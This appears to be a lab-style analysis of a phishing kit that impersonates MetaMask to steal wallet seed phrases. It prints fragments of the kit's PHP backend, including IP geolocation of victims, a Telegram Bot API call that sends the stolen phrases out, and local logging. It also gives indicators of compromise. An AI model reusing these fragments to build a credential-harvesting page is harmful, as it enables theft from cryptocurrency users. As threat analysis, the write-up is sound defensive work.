# Phishing Kit Analysis

## Overview

This investigation focuses on analyzing a phishing kit designed to impersonate a decentralized exchange platform and target cryptocurrency wallet users.

The kit impersonates MetaMask to trick victims into submitting their wallet recovery phrases (Seed Phrases). The collected information is sent to the operator through a Telegram bot, while submitted recovery phrases are also stored locally on the server.

The investigation involved examining the kit's directory structure, analyzing its PHP backend, and inspecting locally stored logs to identify collected credentials and relevant indicators.

## Investigation Findings

### Q1. Which wallet is used for asking the seed phrase?

**Answer: MetaMask**

**Analysis:**

The `metamask.php` file explicitly identifies the targeted wallet in the message template:

```php
<b>Wallet:</b> Metamask
```

This indicates that the phishing kit impersonates MetaMask when requesting the victim's recovery phrase.

**Evidence:** [code.png](screenshots/code.png)

### Q2. What is the file name that has the code for the phishing kit?

**Answer: `metamask.php`**

**Analysis:**

The `metamask.php` file contains the backend PHP code responsible for processing submitted data, collecting victim information, sending the collected information to a Telegram bot, and storing submitted recovery phrases locally.

**Evidence:** [code.png](screenshots/code.png)

### Q3. In which language was the kit written?

**Answer: PHP**

**Analysis:**

The phishing kit's backend is written in PHP. This is evident from the PHP syntax and functions used throughout the source code, including `$_POST`, `$_SERVER`, `file_get_contents()`, `json_decode()`, and `file_put_contents()`.

**Evidence:** [code.png](screenshots/code.png)

### Q4. What service does the kit use to retrieve the victim's machine information?

**Answer: Sypex Geo**

**Analysis:**

The PHP script queries the Sypex Geo API using the victim's IP address:

```php
$request = file_get_contents(
    "http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']
);
```

The returned JSON response is decoded, and the country and city are extracted:

```php
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
```

This service provides geographic information associated with the victim's IP address, allowing the operator to identify the victim's approximate location.

**Evidence:** [code.png](screenshots/code.png)

### Q5. How many seed phrases were already collected?

**Answer: 3**

**Analysis:**

The local `log.txt` file contains three previously collected seed phrases, indicating that the kit had already captured three recovery phrases before the investigation.

**Evidence:** [logs.png](screenshots/logs.png)

### Q6. Could you please provide the seed phrase associated with the most recent phishing incident?

**Answer: The 12-word recovery phrase in the latest log entry.**

**Analysis:**

The local log file stores submitted recovery phrases, with each entry appended to the file. The PHP code responsible for this operation is:

```php
file_put_contents(
    $_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt',
    $text,
    FILE_APPEND
);
```

The `FILE_APPEND` flag ensures that new entries are added to the end of the existing file. By examining the log entries and identifying the most recent one, the recovery phrase associated with the latest phishing incident was retrieved.

The actual recovery phrase is intentionally omitted from this public report to avoid exposing wallet recovery credentials.

**Evidence:** [logs.png](screenshots/logs.png)

### Q7. Which medium was used for credential dumping?

**Answer: Telegram**

**Analysis:**

The phishing kit uses the Telegram Bot API to transmit the collected victim information.

The `sendTel()` function constructs a request to Telegram's `sendMessage` endpoint:

```php
$filename = "https://api.telegram.org/bot".$token.
"/sendMessage?chat_id=".$id.
"&text=".urlencode($message).
"&parse_mode=html";

file_get_contents($filename);
```

The message contains the wallet name, submitted recovery phrase, victim's IP address, geographic information, and User-Agent. This confirms that Telegram is used as the external channel for credential exfiltration.

**Evidence:** [code.png](screenshots/code.png)

### Q8. What is the token for accessing the channel?

**Answer: Telegram Bot API token identified in `metamask.php`.**

**Analysis:**

The Telegram Bot API token is assigned to the `$token` variable inside the `sendTel()` function. It is used to authenticate requests sent to the Telegram Bot API.

The original token is intentionally redacted from this public report because it is an authentication credential.

**Evidence:** [code.png](screenshots/code.png)

### Q9. What is the Chat ID for the phisher's channel?

**Answer: `5442785564`**

**Analysis:**

The Telegram Chat ID is assigned to the `$id` variable inside the `sendTel()` function:

```php
$id = "5442785564";
```

This value identifies the destination chat to which the phishing kit sends the collected information.

**Evidence:** [code.png](screenshots/code.png)

### Q10. What are the allies of the phish kit developer?

**Answer: `j1j1b1s@m3r0`**

**Analysis:**

A comment embedded in the PHP source code contains a message signed by the developer:

```text
With love and respect to all the hustler out there,

This is a small gift to my brothers,

All the best with your luck,

Regards,
j1j1b1s@m3r0
```

The signature reveals the alias `j1j1b1s@m3r0`, which serves as a potential identifier associated with the phishing kit developer.

**Evidence:** [code.png](screenshots/code.png)

---

## Indicators of Compromise (IOCs)

| Indicator | Description |
|---|---|
| `metamask.php` | PHP phishing backend |
| `api.sypexgeo.net` | IP geolocation service |
| `api.telegram.org` | Telegram data exfiltration endpoint |
| `sendMessage` | Telegram Bot API method |
| `5442785564` | Telegram Chat ID |
| `/log/log.txt` | Local file used to store submitted recovery phrases |
| `data` | POST parameter used to receive the submitted phrase |
| `MetaMask` | Impersonated cryptocurrency wallet |
| `j1j1b1s@m3r0` | Alias found in the source code comment |

## Conclusion

The investigation revealed a phishing kit impersonating MetaMask to harvest cryptocurrency wallet recovery phrases.

The PHP backend retrieves geographic information associated with victims' IP addresses through Sypex Geo and collects additional client information through the User-Agent header.

The collected information is transmitted to a Telegram bot, while submitted recovery phrases are also stored locally in `log.txt`.

The investigation identified three previously collected recovery phrases, retrieved the most recent entry, and uncovered additional artifacts, including the Telegram Chat ID and a developer alias embedded in the source code.

These findings demonstrate how phishing kits combine credential harvesting, victim profiling, external data exfiltration, and local data storage within a single backend application.

## Screenshots

- [Directory structure](screenshots/Q1.png)
- [PHP source code](screenshots/code.png)
- [Collected log entries](screenshots/logs.png)
